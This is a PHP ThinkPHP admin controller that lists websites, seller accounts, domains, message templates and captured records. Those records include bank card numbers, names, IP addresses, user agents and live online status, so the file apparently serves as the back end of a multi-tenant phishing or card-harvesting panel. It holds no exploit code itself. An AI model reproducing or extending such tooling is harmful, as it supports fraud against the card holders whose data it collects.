<?php
namespace app\system\controller;

use think\Controller;
use think\facade\Config;
use think\Db;
use think\facade\Session;
use app\system\controller\Base;
/**
* 总控模块
*/
class Index extends Base
{
	public $user;

	public function __construct()
	{
		parent::__construct();
		$this->user = new User();
	}

	public function catweb()
	{
		$wid = Request()->get('id');

		$wdetails = Db::name('web')->where(['id' => $wid])->find();
		$data = Db::name('domainlog')->where(['wid' => $wid])->select();
		$this->assign('data', $data);
		$this->assign('wdetails', $wdetails);
		return $this->fetch('system/catweb');
	}

	public function addwebsite()
	{
		return $this->fetch('system/addwebsite');
	}

	public function editspeech()
	{
		if(Request()->ispost())
		{
			return $this->user->editspeech();
		}
		
		$id = Request()->get('id');
		$res = Db::name('speech')->where(['id' => $id])->find();
		$page = Config::get('speech.');
		$view = Db::name('view')->field('id,name')->select();
		$this->assign('data', $res);
		$this->assign('page', $page);
		$this->assign('view', $view);
		return $this->fetch('system/editspeech');
	}

	public function editview()
	{
		if(Request()->ispost())
		{
			return $this->user->editview();
		}
		
		$id = Request()->get('id');
		$res = Db::name('view')->where(['id' => $id])->find();
		$this->assign('config', json_decode($res['config'], true));
		$this->assign('data', $res);
		return $this->fetch('system/editview');
	}

	public function main()
	{
		return $this->fetch('system/main');
	}

	/*public function updomain()
	{
		return $this->fetch('system/updomain');
	}*/

	/**
	 * 域名申请列表
	 */
	public function domaingain()
	{
		$data = Db::name('domain')->where(['status' => 2])->select();
		$this->assign('list', $data);
		return $this->fetch('system/domaingain');
	}

	public function adddtype()
	{
		if(Request()->ispost())
		{
			return $this->user->adddtype();
		}
		return $this->fetch('system/adddtype');
	}

	/**
	 * 域名种类
	 */
	public function dtype()
	{
		$data = Db::name('dtype')->select();
		$this->assign('list', $data);
		return $this->fetch('system/dtype');
	}
	
	public function index()
	{
		return $this->fetch('system/index');
	}
	
	public function conf()
	{
		$data = Db::name('config')->where('id', 1)->find();
		$this->assign('data',$data);
		return $this->fetch('system/conf');
	}

	public function website()
	{
		$list = Db::name('web')->order('start_time', 'desc')->paginate(10);
        $page = $list->render();
        
        $web = ($list->toArray())['data'];
        
        $today = date('Y-m-d');
        
        foreach ($web as $k => $v)
        {
            $web[$k]['jt'] = Db::name('list')->where(['wid' => $v['id']])->whereBetweenTime('time', $today, $today . ' 23:59:59')->count();
            $web[$k]['jf'] = Db::name('visitlog')->where(['wid' => $v['id']])->whereBetweenTime('time', $today, $today . ' 23:59:59')->count();
            $web[$k]['dz'] = Db::name('list')->where(['wid' => $v['id'], 'online' => 1])->whereBetweenTime('time', $today, $today . ' 23:59:59')->count();
            $web[$k]['js'] = Db::name('delete')->where(['wid' => $v['id']])->whereBetweenTime('time', $today, $today . ' 23:59:59')->count();
        }
        // 获取今日日期
        
        //var_dump($web);die;
        $this->assign('data', $web);
        $this->assign('page', $page);
		return $this->fetch('system/website');
	}

	public function editseller()
	{
		if(Request()->ispost())
		{
			return $this->user->editseller();
		}
		$where = ['id' => Request()->get('id')];
		$data = Db::name('seller')->where($where)->find();
		$this->assign('data', $data);
		return $this->fetch('system/editseller');
	}

	public function seller()
	{
		$where = [];
		if(!empty(Request()->get('sname')))
		{
			$where[ctype_digit(Request()->get('sname'))? 'id' : 'user'] = Request()->get('sname');
		}
		$list = Db::name('seller')->where($where)->order('crTime', 'desc')->paginate(10);
        $page = $list->render();
        $this->assign('list', $list);
        $this->assign('page', $page);
		return $this->fetch('system/seller');
	}

	public function order()
	{

        $vid = empty(Request()->get('temp')) ? 1 : Request()->get('temp');
        $order_vid = empty(Request()->get('temp')) ? 0 : Request()->get('temp');
        $field = Db::name('view')->where('id', $vid)->find();
        $field = unserialize($field['field']);
        $data = [];
        foreach ($field as $key => $value) {
            array_push($data, $value['name']);
        }
        
        $fie = ['vid','online','time','time','uptime','os','ip','ipaddress','agent','status','statusname'];
        array_unshift($data, 'id','wid');
        $data = array_merge($data, $fie);
        //查找数据
        //判断是否查询
        $paramget = Request()->get();
        //$where = [['vid', '=', $vid]];
        $where = [];
        if(!empty($order_vid))
        {
            $where = [['vid', '=', $vid]];
        }
        if(isset($paramget['card']))
        {
            array_push($where, ['bankcard', 'like', '%' . $paramget['card'] . '%']);
        }

        if(isset($paramget['name']))
        {
            array_push($where, ['name', 'like', '%' . $paramget['name']. '%']);
        }

        if(isset($paramget['online']))
        {
            array_push($where, ['online', '=', $paramget['online']]);
        }

        if(isset($paramget['wid']))
        {
            array_push($where, ['wid', '=', $paramget['wid']]);
        }

        //var_dump($where);die;
        $list = Db::name('list')->where($where)->order('time', 'desc')->field($data)->paginate(10);
        $page = $list->render();
        
        $temp = Db::name('view')->select();
        //var_dump($list->toArray());die;
        $speech = Db::name('uspeech')->where(['vid' => $vid])->select();
        $this->assign('speech', $speech);
        //var_dump($list->toArray()['data'], $list);die;
        $this->assign('list', $list->toArray()['data']);
        $this->assign('temp', $temp);
        $this->assign('page', $page);
        $this->assign('field', field2Str($field));
        return $this->fetch('system/order');
	}

	public function domainlist()
	{
		$list = Db::name('domain')->order('crTime', 'desc')->paginate(10);
        $page = $list->render();
        $this->assign('list', $list);
        $this->assign('page', $page);
		return $this->fetch('system/domainlist');
	}

	public function temp()
	{
		$list = Db::name('view')->order('time', 'desc')->paginate(10);
        $page = $list->render();
        $this->assign('list', $list);
        $this->assign('page', $page);
		return $this->fetch('system/temp');
	}

	public function speech()
	{
		$where = [];
		if(!empty(Request()->get('id')))
        {
            $where['vid'] = Request()->get('id');
        }

		$list = Db::name('speech')->where($where)->order('time', 'desc')->paginate(30);
        $page = $list->render();
        $vlist = Db::name('view')->field('id, name')->select();
        $this->assign('vlist', $vlist);
        $this->assign('list', $list);
        $this->assign('page', $page);
		return $this->fetch('system/speech');
	}

	public function addspeech()
	{
		$page = Config::get('speech.');
		$view = Db::name('view')->field('id,name')->select();
		$this->assign('page', $page);
		$this->assign('view', $view);
		return $this->fetch('system/addspeech');
	}

	public function addtemp()
	{
		return $this->fetch('system/addtemp');
	}
}